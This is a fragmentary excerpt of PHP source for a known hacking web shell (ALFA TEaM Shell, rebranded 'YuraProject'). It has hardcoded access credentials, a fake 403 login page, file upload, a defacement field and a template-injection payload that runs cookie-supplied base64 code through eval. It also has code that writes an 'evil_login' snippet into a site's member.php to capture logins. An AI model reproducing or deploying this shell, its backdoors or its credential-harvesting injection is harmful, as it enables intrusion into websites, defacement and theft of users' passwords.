...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => 'ccbc992228428afb39601c9bcc670a3f',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '0',
...
$GLOBALS['__ALFA_COLOR__'] = array(
		...
		"hidden_shell_text" => array(
			"key_color" => "#00FF00",
			"multi_selector" => array("#hidden_sh a" => "color: {color};",
			)
		),
...
<title>.: Yura Tesla :.</title><center>
<center><img style="border-radius:100px;" width="100" height="500" alt="YuraProject" draggable="false" src="https://yuraproject.site/59.jpg" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><tablecellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
echo '<html>';
echo "<title>YuraProject Team</title>";
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="140" height="200" alt="YuraProject" draggable="false" src="https://yuraproject.site/59.jpg" /></td>
</tr>
<tr>
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://yuraproject.site/59.jpg'><br>
...
$newindex = "<p>Dear $newin,</p><p>Recently a request was submitted to reset your password for our clientarea. If you did not request this, please ignore this email. It will expire and become useless in 2 hours time.</p><p>To reset your password, please visit the url below:<br /><a href=\"{\$pw_reset_url}\">{\$pw_reset_url}</a></p><p>When you visit the link above, your password will be reset, and the new password will be emailed to you.</p><p>{\$signature}</p>{php}if(\$_COOKIE[\"sec\"] == \"123\"){eval(base64_decode(\$_COOKIE[\"sec2\"])); die(\"!\");}{\/php}";
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./YuraProject Team &copy; 2020-".date('Y')." ]</span><br><span> <span style='letter-spacing: 2px;color: #dfff00;'>YuraProject@gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/YuraPhsng'>YudiHaxor</a></span></div></td>
</tr>
</table>
</div>
...
<input type="text" name="defacer" size="67" id="text" placeholder="YuraProject" />
<br>
...
$code=str_replace('{saveto_path}',$saveto,$code);$login=$path."/member.php";
$evil_login = "\t".$code."\n\t".$find;
if(@is_file($login) AND @is_writable($login)){
$data_login = @file_get_contents($login);
